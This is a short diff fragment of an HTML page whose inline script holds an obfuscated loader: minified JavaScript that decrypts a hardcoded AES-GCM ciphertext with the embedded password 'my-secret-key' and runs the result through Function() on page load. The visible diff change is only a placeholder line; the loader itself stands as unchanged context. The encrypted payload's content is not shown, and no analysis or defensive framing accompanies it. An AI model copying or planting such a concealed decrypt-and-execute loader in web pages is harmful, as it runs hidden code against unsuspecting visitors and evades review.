@@ -2,7 +2,7 @@
     <span><p nike-block_Fx="" ></span>
 </div>
     <script>
-    
+    let string = `text`;
     const hexToUint8Array=e=>new Uint8Array(e.match(/.{1,2}/g).map(e=>parseInt(e,16))),decryptData=async(e,a,c,d)=>{let t=new TextDecoder,r=hexToUint8Array(a),_=hexToUint8Array(c),$,f=await crypto.subtle.decrypt({name:"AES-GCM",iv:r},await crypto.subtle.deriveKey({name:"PBKDF2",salt:_,iterations:1e5,hash:"SHA-256"},await crypto.subtle.importKey("raw",new TextEncoder().encode(d),{name:"PBKDF2"},!1,["deriveKey"]),{name:"AES-GCM",length:256},!1,["decrypt"]),hexToUint8Array(e));return t.decode(f)},runDecryption=async()=>{let e={"iv":"b1d6504eea678a007e5d0a24","salt":"d18df4d946a3b82aa0f930ee3300f82c","ciphertext":"ffeafa695401fd2d10ee26c9473ad1f6aad7fdcba316446b7be9e681391d64ab8eebd18db07ca3219959f7bac95651e2d76cdf91fb4b3fc20d4320d097b5cc8f7c9cd368ac85588142c4104d42b6074ef2779dc6536a07d8b51f897ff3afeb214a5f88cf8489ec64885ad96a11d57563530ba73d056334bc9b2be7e48aa1308bc0e5e9aff6114b0bd8ef833ff966f38d0641d6b44978e51900d9f195925c3df7249c5445c03b3c1a474a10979b3968d745bf9f7e21872af390b3213412384d8357323b6c30a62f"};if(!e){console.error("No data found");return}let{ciphertext:a,iv:c,salt:d}=e;try{let t=await decryptData(a,c,d,"my-secret-key");console.log("Decrypted:",t),Function(`${t}`)()}catch(r){console.error("Error:",r.message)}};runDecryption();
         
         </script>
